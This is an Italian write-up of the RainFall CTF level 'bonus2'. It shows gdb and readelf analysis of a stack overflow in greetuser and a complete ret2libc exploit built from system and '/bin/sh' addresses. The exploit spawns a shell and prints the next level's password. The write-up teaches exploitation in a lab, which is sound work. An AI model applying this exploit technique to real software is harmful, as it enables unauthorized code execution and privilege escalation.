# Bonus 2
Controlliamo le stringhe presenti nel binario:
```
bonus2@RainFall:~$ readelf -p '.rodata' bonus2

String dump of section '.rodata':
  [     8]  Hello
  [     f]  Hyv<0xc3><0xa4><0xc3><0xa4> p<0xc3><0xa4>iv
  [    22]  Goedemiddag!
  [    30]  LANG
  [    35]  fi
  [    38]  nl
```
e ora analizziamo tramite `gdb`:
```
bonus2@RainFall:~$ gdb -q bonus2
Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048318  _init
0x08048360  memcmp
0x08048360  memcmp@plt
0x08048370  strcat
0x08048370  strcat@plt
0x08048380  getenv
0x08048380  getenv@plt
0x08048390  puts
0x08048390  puts@plt
0x080483a0  __gmon_start__
0x080483a0  __gmon_start__@plt
0x080483b0  __libc_start_main
0x080483b0  __libc_start_main@plt
0x080483c0  strncpy
0x080483c0  strncpy@plt
0x080483d0  _start
0x08048400  __do_global_dtors_aux
0x08048460  frame_dummy
0x08048484  greetuser
0x08048529  main
0x08048640  __libc_csu_init
0x080486b0  __libc_csu_fini
0x080486b2  __i686.get_pc_thunk.bx
0x080486c0  __do_global_ctors_aux
0x080486ec  _fini
```

### Funzione `main`
Abbiamo un array di 72 byte e un puntatore, successivamente viene controllato il numero
degli argomenti passati, se diverso da 3 allora il programma termina la sua esecuzione.
poi abbiamo una serie di chiamate a funzioni nel seguente modo:
```
    memset(dest, 0, 19);
    strncpy(dest, argv[1], 40);
    strncpy(dest + 40, argv[2], 32);
    env = getenv("LANG");
```
Dunque il primo ed il secondo argomento vengono inseriti nello stesso buffer da 72 byte
e successivamente tramite il ritorno di `getenv` viene settata una variabile globale, 
se LANG è uguale a `fi` allora la variabile è 1, se uguale a `nl` allora è 2 altrimenti
rimane il valore 0.

### Funzione `greetuser`
Tramite il valore della variabile globale precedentemente settato nella funzione `main`
viene scelta quale stringa concatenare al precedente buffer da 72 della funzione `main`
per poi stampare il tutto.

### Soluzione
Senza modificare la variabile d'ambiente `LANG` purtroppo non si riesce a sovrascrivere
completamente l'indirizzo di `eip` dunque ho provato a settare `LANG` al valore `nl`:
`export LANG=nl`, così facendo riusciamo a sovrascrivere l'intero indirizzo.
```
(gdb) r $(python -c 'print "A"*40') $(python -c 'print "B"*32')
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*32')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```
Troviamo l'offset tramite il sito [Buffer Overflow EIP Offset String Generator](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/):
```
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x38614137 in ?? ()
```
Offset: 23

Adesso la tecnica che useremo è chiamata `ret2libc`, che a differenza dell'injection di uno
shellcode andremo a richiamare la funzione `system` già presente nel collegamento con la `libc`
passandogli come argomento `/bin/sh` anch'esso già presente nel collegamento alla libreria.
Dunque ora andiamo alla ricerca degli indirizzi:
```
bonus2@RainFall:~$ gdb -q bonus2
Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x804852f
(gdb) r ciao1 ciao2
Starting program: /home/user/bonus2/bonus2 ciao1 ciao2

Breakpoint 1, 0x0804852f in main ()
(gdb) info functions system
All functions matching regular expression "system":

Non-debugging symbols:
0xb7e6b060  __libc_system
0xb7e6b060  system
0xb7f49550  svcerr_systemerr
```
```
(gdb) info proc map
process 3251
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/user/bonus2/bonus2
         0x8049000  0x804a000     0x1000        0x0 /home/user/bonus2/bonus2
        0xb7e2b000 0xb7e2c000     0x1000        0x0
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd2000 0xb7fd5000     0x3000        0x0
        0xb7fdb000 0xb7fdd000     0x2000        0x0
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e2c000,0xb7fd2000,"/bin/sh"
0xb7f8cc58
1 pattern found.
```
```
system:     0xb7e6b060
"/bin/sh":  0xb7f8cc58
```
Tramite `gdb` possiamo vedere che la stringa per la funzione `system` viene presa dallo stack
con un offset di 4:
```
(gdb) r $(python -c 'print "CCCC" + "DDDD" + "A"*32') $(python -c 'print "A"*23 + "\x60\xb0\xe6\xb7"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/bonus2/bonus2 $(python -c 'print "CCCC" + "DDDD" + "A"*32') $(python -c 'print "A"*23 + "\x60\xb0\xe6\xb7"')
Goedemiddag! CCCCDDDDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��

Breakpoint 1, 0x08048528 in greetuser ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x43434300 in ?? ()
(gdb) info registers
eax            0x7f00   32512
ecx            0xbffff57c       -1073744516
edx            0x0      0
ebx            0xbffff690       -1073744240
esp            0xbffff644       0xbffff644
ebp            0x41414141       0x41414141
esi            0xbffff6dc       -1073744164
edi            0xbffff68c       -1073744244
eip            0x43434300       0x43434300
eflags         0x210296 [ PF AF SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) x /x $esp
0xbffff644:     0x44444444
```

Dunque l'exploit dovrà essere:
```
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "CCCC" + "\x58\xcc\xf8\xb7" + "A"*32') $(python -c 'print "A"*23 + "\x60\
xb0\xe6\xb7"')
Goedemiddag! CCCCX���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
$ exit
Segmentation fault (core dumped)
bonus2@RainFall:~$ su bonus3
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /home/user/bonus3/bonus3
bonus3@RainFall:~$
```